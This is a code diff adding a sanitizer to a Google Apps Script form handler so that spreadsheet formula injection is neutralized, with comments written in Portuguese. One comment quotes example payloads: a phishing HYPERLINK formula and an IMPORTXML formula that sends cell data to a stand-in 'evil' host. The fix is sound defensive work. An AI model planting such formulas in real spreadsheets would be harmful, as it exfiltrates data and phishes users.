@@ -399,7 +399,15 @@ function doPost(e) {
       fileLinks = links.join("\n");
     }
 
-    // Adiciona row
+    // Adiciona row.
+    // .map(sanitizeCell_) neutraliza injeção de fórmula no Sheets: um valor de
+    // campo (ou nome de arquivo dentro de fileLinks) que começa com = + - @ TAB
+    // ou CR seria interpretado como fórmula ao abrir a planilha — ex.:
+    //   =HYPERLINK("http://phishing","Confirme sua vaga")  → link malicioso
+    //   =IMPORTXML("http://evil/?d="&D2,"//x")             → exfiltra dados
+    // O prefixo com apóstrofo força tratamento como texto literal (o ' não
+    // aparece na célula). Aplica em tudo do array — os valores fixos/gerados
+    // ("Pendente", data, "") não começam com esses chars, então não muda nada.
     const now = new Date();
     sheet.appendRow([
       "Pendente",
@@ -415,7 +423,7 @@ function doPost(e) {
       fileLinks,
       "",
       "",
-    ]);
+    ].map(sanitizeCell_));
 
     // Envia e-mail de confirmação imediata (best-effort — se falhar, não quebra a inscrição)
     try {
@@ -1014,6 +1022,18 @@ function jsonResponse(obj) {
 function getOrCreateFolder(name) {
   const folders = DriveApp.getFoldersByName(name);
   return folders.hasNext() ? folders.next() : DriveApp.createFolder(name);
+}
+
+// Neutraliza CSV/formula injection no Google Sheets. Valores que começam com
+// =, +, -, @, TAB ou CR são avaliados como fórmula pelo Sheets — um campo do
+// formulário (ou nome de arquivo) malicioso poderia virar HYPERLINK de phishing,
+// IMPORTXML pra exfiltrar dados, ou só poluir a planilha de #ERROR!. Prefixar
+// com apóstrofo força o conteúdo a ser texto literal (o ' fica oculto na célula).
+// Usado no .map() do appendRow — não-strings/nulos viram "".
+function sanitizeCell_(value) {
+  if (value === null || value === undefined) return "";
+  const s = String(value);
+  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
 }
 
 function escapeHtml(str) {
